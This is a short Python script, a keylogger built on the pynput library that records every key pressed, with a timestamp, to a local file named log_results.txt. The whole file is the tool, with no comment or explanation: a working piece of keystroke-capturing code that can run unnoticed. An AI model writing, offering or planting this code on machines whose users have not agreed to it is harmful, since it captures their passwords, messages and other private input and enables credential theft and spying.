from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "log_results.txt"), level=logging.DEBUG, format = '%(asctime)s : %(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
    listener.join()
